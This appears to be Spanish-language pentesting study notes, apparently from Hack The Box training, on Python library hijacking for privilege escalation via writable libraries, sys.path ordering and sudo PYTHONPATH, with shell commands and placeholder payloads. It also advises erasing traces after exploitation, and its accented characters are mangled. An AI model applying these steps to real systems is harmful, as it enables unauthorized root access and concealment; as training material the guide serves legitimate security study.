# üìö **Gu√≠a R√°pida: Python Library Hijacking**

### üéØ **Objetivo**

Ejecutar c√≥digo malicioso aprovechando malas configuraciones en c√≥mo Python carga sus librer√≠as, consiguiendo escalada de privilegios.

## ‚úÖ **Pre-requisitos generales**

- Un **script Python** ejecutable como **SUID** o con **sudo**.
    
- Tener **permiso de lectura** sobre dicho script.
    
- Acceso para modificar librer√≠as o influir en la carga de m√≥dulos.

## üîç **M√©todo 1: Hijacking por permisos de escritura incorrectos**

### üîÑ **Concepto**

Modificar directamente una librer√≠a leg√≠tima que tenga permisos de escritura para nuestro usuario.

### üß© **Pasos**

1. **Identificar un script Python ejecutable con sudo o SUID**
    
```bash
ls -l script.py
# Buscar SUID (-rws) o posibilidad de ejecutarlo con sudo.
```
2. Asegurarte de tener permisos de lectura sobre el script
	Esto te permitir√° inspeccionar el c√≥digo.
3. **Leer el script y detectar la librer√≠a y funci√≥n usada**

```python
import psutil
available_memory = psutil.virtual_memory()
```
- üìå **Objetivo**: Saber qu√© m√≥dulo importa (`psutil`) y qu√© funci√≥n espec√≠fica llama (`virtual_memory()`).
4. Localizar la ruta de la libreria:
```bash
pip3 show psutil
```

6. Localizar la funci√≥n dentro de la librer√≠a:
```bash
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/
```
7. **Verificar si tenemos permisos de escritura en el fichero que contiene la funci√≥n**
```bash
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

```

8. **Insertar c√≥digo malicioso**  
Modificamos la funci√≥n objetivo, por ejemplo:
```python
import os
os.system('id')  # o una reverse shell
```

9. Ejecutar el script vulnerable con privilegios
```bash
sudo /usr/bin/python3 ./script.py
```

## üîç **M√©todo 2: Hijacking mediante la manipulaci√≥n del Library Path**

### üîÑ **Concepto**

Crear una librer√≠a falsa en una ruta de mayor prioridad (seg√∫n `sys.path`) que la ruta oficial.
### üß© **Pasos**

1.  Ver la ubicaci√≥n del m√≥dulo utilizado por el script que podemos ejecutar como sudo o suid:
```bash
htb-student@lpenix:~$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```
2. **Consultar el orden de b√∫squeda de m√≥dulos de Python**
```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```

3. Identificar rutas superiores con permisos de escritura:
```bash
ls -ld /usr/lib/python3.8
```

4. Crear una librer√≠a falsa en la ruta escribible
En `/usr/lib/python3.8/psutil.py`:
```python
import os
def virtual_memory():
    os.system('id')

```

5. Ejecutar el script vulnerable

```bash
sudo /usr/bin/python3 ./script.py
```

## üîç **M√©todo 3: Hijacking usando la variable PYTHONPATH**

### üîÑ **Concepto**

Modificar `PYTHONPATH` para que Python cargue m√≥dulos desde una carpeta controlada por nosotros.

### üß© **Pasos**

1. **Verificar permisos sudo para setear variables de entorno**
    
```bash
sudo -l
# Buscar SETENV en la salida (ejemplo: SETENV: NOPASSWD: /usr/bin/python3)

```

2. **Crear una librer√≠a falsa en una carpeta controlada**  
En `/tmp/psutil.py`:
```python
import os
def virtual_memory():
    os.system('id')

```

3. Ejecutar el script forzando PYTHONPATH:
```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./script.py
```


## üö© **Indicadores de √©xito**

- Se ejecuta tu payload (`id` muestra `uid=0(root)`).
    
- Puedes obtener una shell o ejecutar comandos con privilegios elevados.
    

---

## üí° **Notas y consejos**

- **`sys.path`** siempre es el orden real de b√∫squeda de Python.
    
- **PYTHONPATH** se inserta **al principio** de `sys.path` cuando est√° definida.
    
- Siempre limpia tu rastro tras la explotaci√≥n.
    
- Aseg√∫rate de que tu m√≥dulo falso tenga **el mismo nombre y funci√≥n** que el original (misma firma de la funci√≥n).